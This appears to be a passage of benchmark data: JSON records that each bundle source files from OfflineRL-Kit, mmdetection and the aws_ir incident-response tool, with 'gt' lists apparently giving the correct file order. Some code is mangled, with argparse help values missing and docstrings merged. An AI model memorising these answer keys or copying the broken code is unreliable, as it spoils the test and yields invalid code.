parser.add_argument(\"--rollout-freq\", type=int, default=250)\n    parser.add_argument(\"--dynamics-update-freq\", type=int, default=1000)\n    parser.add_argument(\"--adv-batch-size\", type=int, default=256)\n    parser.add_argument(\"--rollout-batch-size\", type=int, default=50000)\n    parser.add_argument(\"--rollout-length\", type=int, default=5)\n    parser.add_argument(\"--adv-weight\", type=float, default=3e-4)\n    parser.add_argument(\"--model-retain-epochs\", type=int, default=5)\n    parser.add_argument(\"--real-ratio\", type=float, default=0.5)\n    parser.add_argument(\"--load-dynamics-path\", type=str, default=None)\n\n    parser.add_argument(\"--epoch\", type=int, default=2000)\n    parser.add_argument(\"--step-per-epoch\", type=int, default=1000)\n    parser.add_argument(\"--eval_episodes\", type=int, default=10)\n    parser.add_argument(\"--batch-size\", type=int, default=256)\n    parser.add_argument(\"--device\", type=str, default=\"cuda\" if torch.cuda.is_available() else \"cpu\")\n\n    parser.add_argument(\"--include-ent-in-adv\", type=bool, default=False)\n    parser.add_argument(\"--load-bc-path\", type=str, default=None)\n    parser.add_argument(\"--bc-lr\", type=float, default=1e-4)\n    parser.add_argument(\"--bc-epoch\", type=int, default=50)\n    parser.add_argument(\"--bc-batch-size\", type=int, default=256)\n\n    return parser.parse_args()\n\n\ndef train(args=get_args()):\n\n    env = gym.make(args.task)\n    dataset = d4rl.qlearning_dataset(env)\n    args.obs_shape = env.observation_space.shape\n    args.action_dim = np.prod(env.action_space.shape)\n    args.max_action = env.action_space.high[0]\n\n\n    random.seed(args.seed)\n    np.random.seed(args.seed)\n    torch.manual_seed(args.seed)\n    torch.cuda.manual_seed_all(args.seed)\n    torch.backends.cudnn.deterministic = True\n    env.seed(args.seed)\n\n\n    actor_backbone = MLP(input_dim=np.prod(args.obs_shape), hidden_dims=args.hidden_dims)\n    critic1_backbone = MLP(input_dim=np.prod(args.obs_shape) + args.action_dim, hidden_dims=args.hidden_dims)\n    critic2_backbone = MLP(input_dim=np.prod(args.obs_shape) + args.action_dim, hidden_dims=args.hidden_dims)\n    dist = TanhDiagGaussian(\n        latent_dim=getattr(actor_backbone, \"output_dim\"),\n        output_dim=args.action_dim,\n        unbounded=True,\n        conditioned_sigma=True,\n        max_mu=args.max_action\n    )\n    actor = ActorProb(actor_backbone, dist, args.device)\n    critic1 = Critic(critic1_backbone, args.device)\n    critic2 = Critic(critic2_backbone, args.device)\n    actor_optim = torch.optim.Adam(actor.parameters(), lr=args.actor_lr)\n    critic1_optim = torch.optim.Adam(critic1.parameters(), lr=args.critic_lr)\n    critic2_optim = torch.optim.Adam(critic2.parameters(), lr=args.critic_lr)\n\n    if args.auto_alpha:\n        target_entropy = args.target_entropy if args.target_entropy \\\n            else -np.prod(env.action_space.shape)\n\n        args.target_entropy = target_entropy\n\n        log_alpha = torch.zeros(1, requires_grad=True, device=args.device)\n        alpha_optim = torch.optim.Adam([log_alpha], lr=args.alpha_lr)\n        alpha = (target_entropy, log_alpha, alpha_optim)\n    else:\n        alpha = args.alpha\n\n\n    real_buffer = ReplayBuffer(\n        buffer_size=len(dataset[\"observations\"]),\n        obs_shape=args.obs_shape,\n        obs_dtype=np.float32,\n        action_dim=args.action_dim,\n        action_dtype=np.float32,\n        device=args.device\n    )\n    real_buffer.load_dataset(dataset)\n    obs_mean, obs_std = real_buffer.normalize_obs()\n    fake_buffer_size = args.step_per_epoch // args.rollout_freq * args.model_retain_epochs * args.rollout_batch_size * args.rollout_length\n    fake_buffer = ReplayBuffer(\n        buffer_size=fake_buffer_size,\n        obs_shape=args.obs_shape,\n        obs_dtype=np.float32,\n        action_dim=args.action_dim,\n        action_dtype=np.float32,\n        device=args.device\n    )\n\n\n    dynamics_model = EnsembleDynamicsModel(\n        obs_dim=np.prod(args.obs_shape),\n        action_dim=args.action_dim,\n        hidden_dims=args.dynamics_hidden_dims,\n        num_ensemble=args.n_ensemble,\n        num_elites=args.n_elites,\n        weight_decays=args.dynamics_weight_decay,\n        device=args.device\n    )\n    dynamics_optim = torch.optim.Adam(\n        dynamics_model.parameters(),\n        lr=args.dynamics_lr\n    )\n    dynamics_adv_optim = torch.optim.Adam(\n        dynamics_model.parameters(),\n        lr=args.dynamics_adv_lr\n    )\n    dynamics_scaler = StandardScaler()\n    termination_fn = obs_unnormalization(get_termination_fn(task=args.task), obs_mean, obs_std)\n    dynamics = EnsembleDynamics(\n        dynamics_model,\n        dynamics_optim,\n        dynamics_scaler,\n        termination_fn,\n    )\n\n    policy_scaler = StandardScaler(mu=obs_mean, std=obs_std)\n\n\n    policy = RAMBOPolicy(\n        dynamics,\n        actor,\n        critic1,\n        critic2,\n        actor_optim,\n        critic1_optim,\n        critic2_optim,\n        dynamics_adv_optim,\n        tau=args.tau,\n        gamma=args.gamma,\n        alpha=alpha,\n        adv_weight=args.adv_weight,\n        adv_rollout_length=args.rollout_length,\n        adv_rollout_batch_size=args.adv_batch_size,\n        include_ent_in_adv=args.include_ent_in_adv,\n        scaler=policy_scaler,\n        device=args.device\n    ).to(args.device)\n\n\n    log_dirs = make_log_dirs(args.task, args.algo_name, args.seed, vars(args))\n\n    output_config = {\n        \"consoleout_backup\": \"stdout\",\n        \"policy_training_progress\": \"csv\",\n        \"dynamics_training_progress\": \"csv\",\n        \"tb\": \"tensorboard\"\n    }\n    logger = Logger(log_dirs, output_config)\n    logger.log_hyperparameters(vars(args))\n\n\n    policy_trainer = MBPolicyTrainer(\n        policy=policy,\n        eval_env=env,\n        real_buffer=real_buffer,\n        fake_buffer=fake_buffer,\n        logger=logger,\n        rollout_setting=(args.rollout_freq, args.rollout_batch_size, args.rollout_length),\n        dynamics_update_freq=args.dynamics_update_freq,\n        epoch=args.epoch,\n        step_per_epoch=args.step_per_epoch,\n        batch_size=args.batch_size,\n        real_ratio=args.real_ratio,\n        eval_episodes=args.eval_episodes\n    )\n\n\n    if args.load_bc_path:\n        policy.load(args.load_bc_path)\n        policy.to(args.device)\n    else:\n        policy.pretrain(real_buffer.sample_all(), args.bc_epoch, args.bc_batch_size, args.bc_lr, logger)\n    if args.load_dynamics_path:\n        dynamics.load(args.load_dynamics_path)\n    else:\n        dynamics.train(\n            real_buffer.sample_all(),\n            logger,\n            holdout_ratio=0.1,\n            logvar_loss_coef=0.001,\n            max_epochs_since_update=10\n        )\n\n    policy_trainer.train()\n\n\nif __name__ == \"__main__\":\n    train()\n'OfflineRL-Kit/offlinerlkit/policy/__init__.py'\n:from offlinerlkit.policy.base_policy import BasePolicy\n\n\nfrom offlinerlkit.policy.model_free.bc import BCPolicy\nfrom offlinerlkit.policy.model_free.sac import SACPolicy\nfrom offlinerlkit.policy.model_free.td3 import TD3Policy\nfrom offlinerlkit.policy.model_free.cql import CQLPolicy\nfrom offlinerlkit.policy.model_free.iql import IQLPolicy\nfrom offlinerlkit.policy.model_free.mcq import MCQPolicy\nfrom offlinerlkit.policy.model_free.td3bc import TD3BCPolicy\nfrom offlinerlkit.policy.model_free.edac import EDACPolicy\n\n\nfrom offlinerlkit.policy.model_based.mopo import MOPOPolicy\nfrom offlinerlkit.policy.model_based.mobile import MOBILEPolicy\nfrom offlinerlkit.policy.model_based.rambo import RAMBOPolicy\nfrom offlinerlkit.policy.model_based.combo import COMBOPolicy\n\n\n__all__ = [\n    \"BasePolicy\",\n    \"BCPolicy\",\n    \"SACPolicy\",\n    \"TD3Policy\",\n    \"CQLPolicy\",\n    \"IQLPolicy\",\n    \"MCQPolicy\",\n    \"TD3BCPolicy\",\n    \"EDACPolicy\",\n    \"MOPOPolicy\",\n    \"MOBILEPolicy\",\n    \"RAMBOPolicy\",\n    \"COMBOPolicy\"\n]",
        "gt": [
            "'OfflineRL-Kit/offlinerlkit/policy/base_policy.py'",
            "'OfflineRL-Kit/offlinerlkit/policy/__init__.py'",
            "'OfflineRL-Kit/run_example/run_rambo.py'"
        ]
    },
    {
        "files": [
            "'3D-FUTURE-AI-Challenge-Baseline/segmentation/mmdetection/mmdet/models/backbones/__init__.py'",
            "'3D-FUTURE-AI-Challenge-Baseline/segmentation/mmdetection/mmdet/models/backbones/resnext.py'",
            "'3D-FUTURE-AI-Challenge-Baseline/segmentation/mmdetection/mmdet/utils/logger.py'",
            "'3D-FUTURE-AI-Challenge-Baseline/segmentation/mmdetection/mmdet/utils/__init__.py'",
            "'3D-FUTURE-AI-Challenge-Baseline/segmentation/mmdetection/mmdet/models/backbones/resnet.py'"
        ],
        "content": "'3D-FUTURE-AI-Challenge-Baseline/segmentation/mmdetection/mmdet/models/backbones/__init__.py'\n:from .hrnet import HRNet\nfrom .resnet import ResNet, make_res_layer\nfrom .resnext import ResNeXt\nfrom .ssd_vgg import SSDVGG\n\n__all__ = ['ResNet', 'make_res_layer', 'ResNeXt', 'SSDVGG', 'HRNet']\n\n'3D-FUTURE-AI-Challenge-Baseline/segmentation/mmdetection/mmdet/models/backbones/resnext.py'\n:import math\n\nimport torch.nn as nn\n\nfrom mmdet.ops import build_conv_layer, build_norm_layer\nfrom ..registry import BACKBONES\nfrom .resnet import Bottleneck as _Bottleneck\nfrom .resnet import ResNet\n\n\nclass Bottleneck(_Bottleneck):\n\n    def __init__(self, inplanes, planes, groups=1, base_width=4, **kwargs):\n        \"\"\"Bottleneck block for ResNeXt.\n        If style is \"pytorch\", the stride-two layer is the 3x3 conv layer,\n        if it is \"caffe\", the stride-two layer is the first 1x1 conv layer.\n        ResNeXt backbone.\n\n    Args:\n        depth (int): Depth of resnet, from {18, 34, 50, 101, 152}.\n        in_channels (int): Number of input image channels. Normally 3.\n        num_stages (int): Resnet stages, normally 4.\n        groups (int): Group of resnext.\n        base_width (int): Base width of resnext.\n        strides (Sequence[int]): Strides of the first block of each stage.\n        dilations (Sequence[int]): Dilation of each stage.\n        out_indices (Sequence[int]): Output from which stages.\n        style (str): `pytorch` or `caffe`. If set to \"pytorch\", the stride-two\n            layer is the 3x3 conv layer, otherwise the stride-two layer is\n            the first 1x1 conv layer.\n        frozen_stages (int): Stages to be frozen (all param fixed). -1 means\n            not freezing any parameters.\n        norm_cfg (dict): dictionary to construct and config norm layer.\n        norm_eval (bool): Whether to set norm layers to eval mode, namely,\n            freeze running stats (mean and var). Note: Effect on Batch Norm\n            and its variants only.\n        with_cp (bool): Use checkpoint or not. Using checkpoint will save some\n            memory while slowing down the training speed.\n        zero_init_residual (bool): whether to use zero init for last norm layer\n            in resblocks to let them behave as identity.\n\n    Example:\n        >>> from mmdet.models import ResNeXt\n        >>> import torch\n        >>> self = ResNeXt(depth=50)\n        >>> self.eval()\n        >>> inputs = torch.rand(1, 3, 32, 32)\n        >>> level_outputs = self.forward(inputs)\n        >>> for level_out in level_outputs:\n        ...     print(tuple(level_out.shape))\n        (1, 256, 8, 8)\n        (1, 512, 4, 4)\n        (1, 1024, 2, 2)\n        (1, 2048, 1, 1)\n    Get the root logger.\n\n    The logger will be initialized if it has not been initialized. By default a\n    StreamHandler will be added. If `log_file` is specified, a FileHandler will\n    also be added. The name of the root logger is the top-level package name,\n    e.g., \"mmdet\".\n\n    Args:\n        log_file (str | None): The log filename. If specified, a FileHandler\n            will be added to the root logger.\n        log_level (int): The root logger level. Note that only the process of\n            rank 0 is affected, while other processes will set the level to\n            \"Error\" and be silent most of the time.\n\n    Returns:\n        logging.Logger: The root logger.\n    Print a log message.\n\n    Args:\n        msg (str): The message to be logged.\n        logger (logging.Logger | str | None): The logger to be used. Some\n            special loggers are:\n            - \"root\": the root logger obtained with `get_root_logger()`.\n            - \"silent\": no message will be printed.\n            - None: The `print()` method will be used to print log messages.\n        level (int): Logging level. Only available when `logger` is a Logger\n            object or \"root\".\n    \"\"\"\n    if logger is None:\n        print(msg)\n    elif logger == 'root':\n        _logger = get_root_logger()\n        _logger.log(level, msg)\n    elif isinstance(logger, logging.Logger):\n        logger.log(level, msg)\n    elif logger != 'silent':\n        raise TypeError(\n            'logger should be either a logging.Logger object, \"root\", '\n            '\"silent\" or None, but got {}'.format(logger))\n\n'3D-FUTURE-AI-Challenge-Baseline/segmentation/mmdetection/mmdet/utils/__init__.py'\n:from .collect_env import collect_env\nfrom .flops_counter import get_model_complexity_info\nfrom .logger import get_root_logger, print_log\nfrom .registry import Registry, build_from_cfg\n\n__all__ = [\n    'Registry', 'build_from_cfg', 'get_model_complexity_info',\n    'get_root_logger', 'print_log', 'collect_env'\n]\n\n'3D-FUTURE-AI-Challenge-Baseline/segmentation/mmdetection/mmdet/models/backbones/resnet.py'\n:import torch.nn as nn\nimport torch.utils.checkpoint as cp\nfrom mmcv.cnn import constant_init, kaiming_init\nfrom mmcv.runner import load_checkpoint\nfrom torch.nn.modules.batchnorm import _BatchNorm\n\nfrom mmdet.ops import (ContextBlock, GeneralizedAttention, build_conv_layer,\n                       build_norm_layer)\nfrom mmdet.utils import get_root_logger\nfrom ..registry import BACKBONES\n\n\nclass BasicBlock(nn.Module):\n    expansion = 1\n\n    def __init__(self,\n                 inplanes,\n                 planes,\n                 stride=1,\n                 dilation=1,\n                 downsample=None,\n                 style='pytorch',\n                 with_cp=False,\n                 conv_cfg=None,\n                 norm_cfg=dict(type='BN'),\n                 dcn=None,\n                 gcb=None,\n                 gen_attention=None):\n        super(BasicBlock, self).__init__()\n        assert dcn is None, 'Not implemented yet.'\n        assert gen_attention is None, 'Not implemented yet.'\n        assert gcb is None, 'Not implemented yet.'\n\n        self.norm1_name, norm1 = build_norm_layer(norm_cfg, planes, postfix=1)\n        self.norm2_name, norm2 = build_norm_layer(norm_cfg, planes, postfix=2)\n\n        self.conv1 = build_conv_layer(\n            conv_cfg,\n            inplanes,\n            planes,\n            3,\n            stride=stride,\n            padding=dilation,\n            dilation=dilation,\n            bias=False)\n        self.add_module(self.norm1_name, norm1)\n        self.conv2 = build_conv_layer(\n            conv_cfg, planes, planes, 3, padding=1, bias=False)\n        self.add_module(self.norm2_name, norm2)\n\n        self.relu = nn.ReLU(inplace=True)\n        self.downsample = downsample\n        self.stride = stride\n        self.dilation = dilation\n        assert not with_cp\n\n    @property\n    def norm1(self):\n        return getattr(self, self.norm1_name)\n\n    @property\n    def norm2(self):\n        return getattr(self, self.norm2_name)\n\n    def forward(self, x):\n        identity = x\n\n        out = self.conv1(x)\n        out = self.norm1(out)\n        out = self.relu(out)\n\n        out = self.conv2(out)\n        out = self.norm2(out)\n\n        if self.downsample is not None:\n            identity = self.downsample(x)\n\n        out += identity\n        out = self.relu(out)\n\n        return out\n\n\nclass Bottleneck(nn.Module):\n    expansion = 4\n\n    def __init__(self,\n                 inplanes,\n                 planes,\n                 stride=1,\n                 dilation=1,\n                 downsample=None,\n                 style='pytorch',\n                 with_cp=False,\n                 conv_cfg=None,\n                 norm_cfg=dict(type='BN'),\n                 dcn=None,\n                 gcb=None,\n                 gen_attention=None):\n        \"\"\"Bottleneck block for ResNet.\n        If style is \"pytorch\", the stride-two layer is the 3x3 conv layer,\n        if it is \"caffe\", the stride-two layer is the first 1x1 conv layer.\n        ResNet backbone.\n\n    Args:\n        depth (int): Depth of resnet, from {18, 34, 50, 101, 152}.\n        in_channels (int): Number of input image channels. Normally 3.\n        num_stages (int): Resnet stages, normally 4.\n        strides (Sequence[int]): Strides of the first block of each stage.\n        dilations (Sequence[int]): Dilation of each stage.\n        out_indices (Sequence[int]): Output from which stages.\n        style (str): `pytorch` or `caffe`. If set to \"pytorch\", the stride-two\n            layer is the 3x3 conv layer, otherwise the stride-two layer is\n            the first 1x1 conv layer.\n        frozen_stages (int): Stages to be frozen (stop grad and set eval mode).\n            -1 means not freezing any parameters.\n        norm_cfg (dict): dictionary to construct and config norm layer.\n        norm_eval (bool): Whether to set norm layers to eval mode, namely,\n            freeze running stats (mean and var). Note: Effect on Batch Norm\n            and its variants only.\n        with_cp (bool): Use checkpoint or not. Using checkpoint will save some\n            memory while slowing down the training speed.\n        zero_init_residual (bool): whether to use zero init for last norm layer\n            in resblocks to let them behave as identity.\n\n    Example:\n        >>> from mmdet.models import ResNet\n        >>> import torch\n        >>> self = ResNet(depth=18)\n        >>> self.eval()\n        >>> inputs = torch.rand(1, 3, 32, 32)\n        >>> level_outputs = self.forward(inputs)\n        >>> for level_out in level_outputs:\n        ...     print(tuple(level_out.shape))\n        (1, 64, 8, 8)\n        (1, 128, 4, 4)\n        (1, 256, 2, 2)\n        (1, 512, 1, 1)\n    \"\"\"\n\n    arch_settings = {\n        18: (BasicBlock, (2, 2, 2, 2)),\n        34: (BasicBlock, (3, 4, 6, 3)),\n        50: (Bottleneck, (3, 4, 6, 3)),\n        101: (Bottleneck, (3, 4, 23, 3)),\n        152: (Bottleneck, (3, 8, 36, 3))\n    }\n\n    def __init__(self,\n                 depth,\n                 in_channels=3,\n                 num_stages=4,\n                 strides=(1, 2, 2, 2),\n                 dilations=(1, 1, 1, 1),\n                 out_indices=(0, 1, 2, 3),\n                 style='pytorch',\n                 frozen_stages=-1,\n                 conv_cfg=None,\n                 norm_cfg=dict(type='BN', requires_grad=True),\n                 norm_eval=True,\n                 dcn=None,\n                 stage_with_dcn=(False, False, False, False),\n                 gcb=None,\n                 stage_with_gcb=(False, False, False, False),\n                 gen_attention=None,\n                 stage_with_gen_attention=((), (), (), ()),\n                 with_cp=False,\n                 zero_init_residual=True):\n        super(ResNet, self).__init__()\n        if depth not in self.arch_settings:\n            raise KeyError('invalid depth {} for resnet'.format(depth))\n        self.depth = depth\n        self.num_stages = num_stages\n        assert num_stages >= 1 and num_stages <= 4\n        self.strides = strides\n        self.dilations = dilations\n        assert len(strides) == len(dilations) == num_stages\n        self.out_indices = out_indices\n        assert max(out_indices) < num_stages\n        self.style = style\n        self.frozen_stages = frozen_stages\n        self.conv_cfg = conv_cfg\n        self.norm_cfg = norm_cfg\n        self.with_cp = with_cp\n        self.norm_eval = norm_eval\n        self.dcn = dcn\n        self.stage_with_dcn = stage_with_dcn\n        if dcn is not None:\n            assert len(stage_with_dcn) == num_stages\n        self.gen_attention = gen_attention\n        self.gcb = gcb\n        self.stage_with_gcb = stage_with_gcb\n        if gcb is not None:\n            assert len(stage_with_gcb) == num_stages\n        self.zero_init_residual = zero_init_residual\n        self.block, stage_blocks = self.arch_settings[depth]\n        self.stage_blocks = stage_blocks[:num_stages]\n        self.inplanes = 64\n\n        self._make_stem_layer(in_channels)\n\n        self.res_layers = []\n        for i, num_blocks in enumerate(self.stage_blocks):\n            stride = strides[i]\n            dilation = dilations[i]\n            dcn = self.dcn if self.stage_with_dcn[i] else None\n            gcb = self.gcb if self.stage_with_gcb[i] else None\n            planes = 64 * 2**i\n            res_layer = make_res_layer(\n                self.block,\n                self.inplanes,\n                planes,\n                num_blocks,\n                stride=stride,\n                dilation=dilation,\n                style=self.style,\n                with_cp=with_cp,\n                conv_cfg=conv_cfg,\n                norm_cfg=norm_cfg,\n                dcn=dcn,\n                gcb=gcb,\n                gen_attention=gen_attention,\n                gen_attention_blocks=stage_with_gen_attention[i])\n            self.inplanes = planes * self.block.expansion\n            layer_name = 'layer{}'.format(i + 1)\n            self.add_module(layer_name, res_layer)\n            self.res_layers.append(layer_name)\n\n        self._freeze_stages()\n\n        self.feat_dim = self.block.expansion * 64 * 2**(\n            len(self.stage_blocks) - 1)\n\n    @property\n    def norm1(self):\n        return getattr(self, self.norm1_name)\n\n    def _make_stem_layer(self, in_channels):\n        self.conv1 = build_conv_layer(\n            self.conv_cfg,\n            in_channels,\n            64,\n            kernel_size=7,\n            stride=2,\n            padding=3,\n            bias=False)\n        self.norm1_name, norm1 = build_norm_layer(self.norm_cfg, 64, postfix=1)\n        self.add_module(self.norm1_name, norm1)\n        self.relu = nn.ReLU(inplace=True)\n        self.maxpool = nn.MaxPool2d(kernel_size=3, stride=2, padding=1)\n\n    def _freeze_stages(self):\n        if self.frozen_stages >= 0:\n            self.norm1.eval()\n            for m in [self.conv1, self.norm1]:\n                for param in m.parameters():\n                    param.requires_grad = False\n\n        for i in range(1, self.frozen_stages + 1):\n            m = getattr(self, 'layer{}'.format(i))\n            m.eval()\n            for param in m.parameters():\n                param.requires_grad = False\n\n    def init_weights(self, pretrained=None):\n        if isinstance(pretrained, str):\n            logger = get_root_logger()\n            load_checkpoint(self, pretrained, strict=False, logger=logger)\n        elif pretrained is None:\n            for m in self.modules():\n                if isinstance(m, nn.Conv2d):\n                    kaiming_init(m)\n                elif isinstance(m, (_BatchNorm, nn.GroupNorm)):\n                    constant_init(m, 1)\n\n            if self.dcn is not None:\n                for m in self.modules():\n                    if isinstance(m, Bottleneck) and hasattr(\n                            m.conv2, 'conv_offset'):\n                        constant_init(m.conv2.conv_offset, 0)\n\n            if self.zero_init_residual:\n                for m in self.modules():\n                    if isinstance(m, Bottleneck):\n                        constant_init(m.norm3, 0)\n                    elif isinstance(m, BasicBlock):\n                        constant_init(m.norm2, 0)\n        else:\n            raise TypeError('pretrained must be a str or None')\n\n    def forward(self, x):\n        x = self.conv1(x)\n        x = self.norm1(x)\n        x = self.relu(x)\n        x = self.maxpool(x)\n        outs = []\n        for i, layer_name in enumerate(self.res_layers):\n            res_layer = getattr(self, layer_name)\n            x = res_layer(x)\n            if i in self.out_indices:\n                outs.append(x)\n        return tuple(outs)\n\n    def train(self, mode=True):\n        super(ResNet, self).train(mode)\n        self._freeze_stages()\n        if mode and self.norm_eval:\n            for m in self.modules():\n\n                if isinstance(m, _BatchNorm):\n                    m.eval()\n",
        "gt": [
            "'3D-FUTURE-AI-Challenge-Baseline/segmentation/mmdetection/mmdet/utils/logger.py'",
            "'3D-FUTURE-AI-Challenge-Baseline/segmentation/mmdetection/mmdet/utils/__init__.py'",
            "'3D-FUTURE-AI-Challenge-Baseline/segmentation/mmdetection/mmdet/models/backbones/resnet.py'",
            "'3D-FUTURE-AI-Challenge-Baseline/segmentation/mmdetection/mmdet/models/backbones/resnext.py'",
            "'3D-FUTURE-AI-Challenge-Baseline/segmentation/mmdetection/mmdet/models/backbones/__init__.py'"
        ]
    },
    {
        "files": [
            "'aws_ir/aws_ir/libs/case.py'",
            "'aws_ir/aws_ir/cli.py'",
            "'aws_ir/tests/test_cli.py'"
        ],
        "content": "'aws_ir/aws_ir/libs/case.py'\n:\nimport logging\nimport os\nimport random\nimport sys\n\nfrom datetime import datetime\n\nimport aws_ir\nfrom aws_ir.libs import aws\nfrom aws_ir.libs import connection\nfrom aws_ir.libs import inventory\nfrom aws_ir.libs import s3bucket\n\n\nlogger = logging.getLogger(__name__)\n\n\nclass Case(object):\n\n    def __init__(\n        self,\n        case_number=None,\n        examiner_cidr_range='0.0.0.0/0',\n        case_bucket=None,\n        profile='default',\n        case_type=None\n    ):\n        self.profile = profile\n\n        self.ec2_client = connection.Connection(\n            type='client',\n            service='ec2',\n            region='us-west-2',\n            profile=self.profile\n        )\n\n        self.s3_resource = connection.Connection(\n            type='resource',\n            service='s3',\n            region='us-west-2',\n            profile=self.profile\n        )\n\n        if case_number:\n            self.case_number = case_number\n        else:\n            self.case_number = self._generate_case_number()\n\n        if case_bucket:\n            self.case_bucket = case_bucket\n        else:\n            self.case_bucket = self._setup_bucket(region='us-west-2')\n\n        self.examiner_cidr_range = examiner_cidr_range\n\n    def prep_aws_connections(self):\n\n        logger.info(\"Initial connection to AmazonWebServices made.\")\n\n        self.amazon = aws.AmazonWebServices(\n            self.ec2_client\n        )\n\n        self.available_regions = self.amazon.regions\n\n        logger.info((\"Inventory AWS Regions Complete {region_count} \"\n                     \"found.\".format(region_count=len(self.amazon.regions))))\n\n        self.availability_zones = self.amazon.availability_zones\n\n        logger.info(\n            (\n                \"Inventory Availability Zones Complete {zone_count} \"\n                \"found.\".format(zone_count=len(self.amazon.availability_zones))\n            )\n        )\n\n        logger.info((\"Beginning inventory of resources world wide.  \"\n                     \"This might take a minute...\"))\n\n        self.aws_inventory = inventory.Inventory(\n            self.ec2_client,\n            self.available_regions\n        )\n\n        logger.info((\"Inventory complete.  Proceeding to resource \"\n                     \"identification.\"))\n\n        self.inventory = self.aws_inventory.inventory\n\n    def _rename_log_file(self, case_number, resource_id, base_dir=\"/tmp\"):\n\n        try:\n            os.rename(\n                (\"{base_dir}/{case_number}-aws_ir.log\").format(\n                    base_dir=base_dir,\n                    case_number=case_number,\n                ),\n                (\"{base_dir}/{case_number}-{resource_id}-aws_ir.log\").format(\n                    base_dir=base_dir,\n                    case_number=case_number,\n                    resource_id=resource_id\n                )\n            )\n            return True\n        except Exception:\n            return False\n\n    def copy_logs_to_s3(self, base_dir=\"/tmp\"):\n\n        case_bucket = self._get_case_bucket()\n        logs = self._get_case_logs(base_dir=base_dir)\n        for log in logs:\n            case_bucket.upload_file(\n                \"{base_dir}/{log}\".format(\n                    base_dir=base_dir,\n                    log=log\n                ),\n                log\n            )\n\n    def teardown(self, region, resource_id):\n\n        try:\n            aws_ir.wrap_log_file(self.case_number)\n            self._rename_log_file(self.case_number, resource_id)\n            self.copy_logs_to_s3()\n            processing_end_messaging = (\n                \"\"\"Processing complete for {case_number}\\nArtifacts stored in s3://{case_bucket}\"\"\"\n            ).format(case_number=self.case_number,\n                     case_bucket=self.case_bucket)\n            print(processing_end_messaging)\n            sys.exit(0)\n        except Exception as e:\n            logger.error(\n                (\"Error uploading case logs for {case_number} to s3 \"\n                 \"bucket {case_bucket}: {ex}\".format(\n                     case_number=self.case_number,\n                     case_bucket=self.case_bucket,\n                     ex=e)\n                 )\n            )\n\n            sys.exit(1)\n\n    def _get_case_logs(self, base_dir=\"/tmp\"):\n\n        files = []\n        for file in os.listdir(base_dir):\n            if file.startswith(self.case_number):\n                files.append(file)\n        return files\n\n    def _setup_bucket(self, region):\n\n        client = connection.Connection(\n            type='client',\n            service='s3'\n        ).connect()\n\n        bucket_name = s3bucket.CaseBucket(\n            self.case_number,\n            region,\n            client,\n            self.s3_resource\n        ).bucket.name\n\n        return bucket_name\n\n    def _get_case_bucket(self):\n        return self.s3_resource.connect().Bucket(self.case_bucket)\n\n    def _generate_case_number(self):\n        return datetime.utcnow().strftime(\n            'cr-%y-%m%d%H-{0:04x}'\n        ).format(\n            random.randint(0, 2 ** 16)\n        )\n\n'aws_ir/aws_ir/cli.py'\n:\nimport argparse\nimport logging\nimport os\nimport sys\n\nimport aws_ir\nfrom aws_ir import __version__\nfrom aws_ir.libs import case\nfrom aws_ir.libs import plugin\n\n\nfrom aws_ir.plans import host\nfrom aws_ir.plans import key\n\n\n\n\n\nclass cli():\n    def __init__(self):\n        self.config = None\n        self.prog = sys.argv[0].split('/')[-1]\n\n\n    def parse_args(self, args):\n\n        parser = argparse.ArgumentParser(\n            description=\n        )\n\n        optional_args = parser.add_argument_group()\n\n        optional_args.add_argument(\n            '--version',\n            action='version',\n            version=\"%(prog)s {ver}\".format(ver=__version__))\n\n        optional_args.add_argument(\n            '--verbose',\n            action='store_true',\n            help='log debug messages')\n\n        optional_args.add_argument(\n            '--profile',\n            default='default',\n            help=\n        )\n\n        optional_args.add_argument(\n            '--case-number',\n            default=None,\n            help=\"\"\"\n                The case number to use., usually of the form\n                \"cr-16-053018-2d2d\"\n\n                The IP/CIDR for the examiner and/or the tool.\n                This will be added as the only allowed range\n                in the isolated security group.\n\n                Optional.\n                The id of the s3 bucket to use.\n                This must already exist\n\n                Dry run. Pass dry run\n                parameter to perform API calls\n                but will not modify any resources.\n            \"\"\"\n        )\n\n        subparsers = parser.add_subparsers(dest=\"compromise-type\")\n        subparsers.required = True\n\n        instance_compromise_parser = subparsers.add_parser(\n            'instance-compromise', help=''\n        )\n\n        instance_compromise_parser.add_argument(\n            '--target',\n            required=False,\n            help=\n        )\n\n        instance_compromise_parser.add_argument(\n            '--targets',\n            required=False,\n            help=\n        )\n\n        instance_compromise_parser.add_argument(\n            '--user',\n            required=False,\n            help=\n        )\n        instance_compromise_parser.add_argument(\n            '--ssh-key',\n            required=False,\n            help='provide the path to the ssh private key for the user. Required for memory only.'\n        )\n\n        instance_compromise_parser.add_argument(\n            '--plugins',\n            required=False,\n            default=\"gather_host,isolate_host,\"\n                    \"tag_host,snapshotdisks_host,\"\n                    \"examineracl_host,get_memory,stop_host\",\n            help=\"Run some or all of the plugins in a custom order. \"\n                 \"Provided as a comma separated list of \"\n                 \"supported plugins: \\n\"\n                 \"{p}\".format(\n                    p=plugin.Core().instance_plugins()\n                 )\n        )\n\n        instance_compromise_parser.set_defaults(func=\"instance_compromise\")\n\n        key_compromise_parser = subparsers.add_parser(\n            'key-compromise',\n            help=''\n        )\n\n        key_compromise_parser.add_argument(\n            '--access-key-id', required=True, help=''\n        )\n\n        key_compromise_parser.add_argument(\n            '--plugins',\n            default=\"disableaccess_key,revokests_key\",\n            required=False,\n            help=\"Run some or all of the plugins in a custom order.\"\n                 \" Provided as a comma separated list\"\n                 \"Supported plugins: \\n\"\n                 \"{p}\".format(\n                    p=plugin.Core().key_plugins()\n                 )\n        )\n\n        key_compromise_parser.set_defaults(func=\"key_compromise\")\n\n        return parser.parse_args(args)\n\n\n    def run(self):\n        self.config = self.parse_args(sys.argv[1:])\n        case_obj = case.Case(\n            self.config.case_number,\n            self.config.examiner_cidr_range,\n            self.config.bucket_name,\n            self.config.profile\n        )\n\n        if self.config.verbose:\n            log_level = logging.DEBUG\n        else:\n            log_level = logging.INFO\n\n        aws_ir.set_stream_logger(level=log_level)\n        aws_ir.set_file_logger(case_obj.case_number, level=log_level)\n        logger = logging.getLogger(__name__)\n\n        aws_ir.wrap_log_file(case_obj.case_number)\n        logger.info(\"Initialization successful proceeding to incident plan.\")\n        if self.config.func == 'instance_compromise':\n            if self.config.target:\n                case_obj.prep_aws_connections()\n                hc = host.Compromise(\n                    user=self.config.user,\n                    ssh_key_file=self.config.ssh_key,\n                    target=self.config.target,\n                    prog=self.prog,\n                    case=case_obj,\n                    steps=self.config.plugins\n                )\n                try:\n                    hc.mitigate()\n                except KeyboardInterrupt:\n                    pass\n            if self.config.targets:\n        